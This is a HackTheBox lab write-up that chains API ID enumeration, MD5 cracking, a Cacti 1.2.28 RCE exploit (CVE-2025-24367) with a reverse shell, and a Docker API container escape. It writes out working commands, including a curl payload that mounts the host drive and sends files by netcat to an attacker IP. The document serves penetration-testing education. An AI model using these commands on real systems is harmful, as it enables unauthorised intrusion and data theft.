---
title: "MonitorsFour - HackTheBox Writeup"
date: "2025-12-06"
platform: "HackTheBox"
category: "Windows / Docker Escape"
difficulty: "Medium"
tags: [
  "API Enumeration",
  "IDOR",
  "Credential Harvesting",
  "MD5 Cracking",
  "Web Application",
  "Cacti 1.2.28",
  "CVE-2025-24367",
  "Remote Code Execution",
  "Reverse Shell",
  "Docker",
  "Docker API Abuse",
  "Container Escape",
  "Privilege Escalation",
  "Host Filesystem Mounting",
  "Weak Hashing",
  "Subdomain Enumeration",
  "Service Misconfiguration"
]
excerpt: "A Windows-based HTB machine involving API enumeration for credential discovery, exploitation of Cacti 1.2.28 (CVE-2025-24367) for initial shell inside a Docker container, and full system compromise through an insecure Docker API allowing host filesystem access and container breakout."
readingTime: 25
featured: true
---
## TL;DR

MonitorsFour is a medium-difficulty Windows box featuring API enumeration to discover admin credentials, exploitation of Cacti 1.2.28 (CVE-2025-24367) for initial access, and privilege escalation via Docker API abuse to break out of a container and access the host filesystem. The box demonstrates the dangers of exposed APIs, weak credential storage, and insecure Docker configurations.

---

## Reconnaissance

Starting with our trusty nmap scan:

```bash
nmap -T4 -o mointor_four.txt 10.10.11.98
```

Results come back quickly:

```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Two ports open:

- **Port 80** - HTTP (Web service)
- **Port 5985** - WinRM (Windows Remote Management)

The WinRM port is interesting, but we'll need credentials first. Let's check out the web service.

---

## Web Enumeration - The API Hunt

Navigating to the website, we notice something interesting in the network requests:

![1](1.png)

**Aha!** The application is making API calls. This smells like an opportunity for some good old-fashioned API enumeration.

### API Enumeration - Finding the Treasure

When we see API calls with IDs, the first thing any self-respecting pentester does is... **enumerate those IDs!** Let's start incrementing and see what we find.

Testing different ID values:

- `id=1` - Regular user
- `id=2` - **JACKPOT!** 🎰

![2](2.png)

We discovered admin credentials! But they're hashed. Let's take a closer look at that hash format.

### Password Cracking - MD5 to the Rescue

The hash looks like MD5 (32 hex characters). Time to visit our favorite online cracking service: [CrackStation](https://crackstation.net/)

![3](3.png)

**Cracked instantly!**

```
admin:wonderful1
```

Gotta love weak passwords and MD5 hashes in 2025! 😅

---

## Further Enumeration

With credentials in hand, let's do some more reconnaissance:

### Directory Busting

![4](4.png)

Directory busting didn't reveal anything groundbreaking, but it's always good practice.

### Subdomain Discovery

Now let's hunt for subdomains:

![5](5.png)

**Bingo!** We found a subdomain:

```
cacti.monitorsfour.htb
```

Let's add this to our `/etc/hosts`:

```bash
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

## Main Site - Admin Dashboard

Before diving into the Cacti subdomain, let's use our freshly cracked credentials on the main site:

![6](6.png)

We're in! The admin dashboard has several interesting sections, but two stand out:

### 1. Changelog - The Infrastructure Hint

![7](7.png)

There's an **infrastructure notice** about Docker versions. Mental note: this will be crucial for privilege escalation later! 🐋

### 2. Users Section

The users section confirms we have admin-level access, but the real prize is that Cacti subdomain...

---

## Cacti Subdomain - The Vulnerable Application

Let's try our credentials on the Cacti login page:

![8](8.png)

**Success!** We're logged into Cacti, and we can see it's running version **1.2.28**.

### Version 1.2.28 - Known Vulnerability

A quick search reveals that Cacti 1.2.28 is vulnerable to **CVE-2025-24367** - a remote code execution vulnerability!

There's a ready-made exploit available:

```
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
```

---

## Exploitation - Popping the First Shell

Time to weaponize this vulnerability!

### Setting Up the Attack

1. **Start a netcat listener:**
    
    ```bash
    nc -lvnp 4444
    ```
    
2. **Run the exploit:**
    
    ```bash
    python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.66 -l 4444 -url http://cacti.monitorsfour.htb
    ```
    
    Wait, who's `marcus`? Checking back at the user enumeration, we likely found this username in the API responses!
    
3. **Watch the magic happen:**
    

![9](9.png)

**Shell acquired!** 🎉 We now have command execution on the box.

### User Flag

Navigating to the user directory, we grab our first flag:

```
45638b9627f94c530c587a579de311ea
```

---

## Privilege Escalation - Docker Breakout

Remember that infrastructure notice about Docker versions? Time to put it to use!

### Understanding the Environment

We're inside a Docker container, but the host is running an **outdated Docker version** with an exposed Docker API. This is a classic container escape scenario.

### The Docker API Exploit

Older Docker versions often have the Docker API exposed without authentication on port 2375. We can abuse this to:

1. Create a new container
2. Mount the host filesystem
3. Execute commands on the HOST, not the container

### Crafting the Payload

Here's our evil Docker API payload:

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"docker_setup-nginx-php:latest",
    "Cmd":["bash","-c","find /host_root -name \"*.txt\" -o -name \"*flag*\" 2>/dev/null | nc 10.10.15.66 4445"],
    "HostConfig":{
      "Binds":["/mnt/host/c:/host_root"]
    }
  }' \
  http://192.168.65.7:2375/containers/create
```

**What does this do?**

1. **Creates a new container** using an existing image
2. **Mounts the host's C: drive** to `/host_root` inside the container
3. **Executes a find command** to locate flag files
4. **Exfiltrates results** via netcat to our listener

### Execution

1. **Start another listener:**
    
    ```bash
    nc -lvnp 4445
    ```
    
2. **Execute the container creation:**
    
    ```bash
    curl -X POST http://192.168.65.7:2375/containers/create [payload]
    ```
    
3. **Extract the container ID and start it:**
    
    ```bash
    cid=$(cut -d'"' -f4 create.json)
    curl -X POST http://192.168.65.7:2375/containers/$cid/start
    ```
    

### Root Access Achieved!

![10](10.png)

**We've broken out of the container!** We now have access to the host filesystem.

### Root Flag

The root flag can be found at:

```
/host_root/Users/Administrator/Desktop/root.txt
```

**Root flag:**

```
f592c9e1be79ad86c2b405c895c9fb74
```

---

## Attack Chain Summary

```
API Enumeration (id=2)
    ↓
Admin Credentials (MD5 Hash)
    ↓
CrackStation (wonderful1)
    ↓
Subdomain Discovery (cacti.monitorsfour.htb)
    ↓
Cacti 1.2.28 (CVE-2025-24367)
    ↓
RCE & Shell (Container)
    ↓
Docker API Abuse (Port 2375)
    ↓
Container Escape
    ↓
Host Filesystem Access
    ↓
ROOT!
```

---

## Conclusion

MonitorsFour was an excellent demonstration of modern container security pitfalls. The box showed how multiple small misconfigurations can chain together into complete system compromise:

Starting from a simple API endpoint → weak credentials → vulnerable application → container escape → full host access.

The key lesson? **Security is a chain, and it's only as strong as its weakest link.** In this case, that weak link was everywhere! 😄

The Docker escape technique is particularly relevant in today's containerized world. As Docker and Kubernetes become ubiquitous, understanding these attacks becomes crucial for both red and blue teamers.

Remember: **Just because you're in a container doesn't mean you're contained!** 🐳
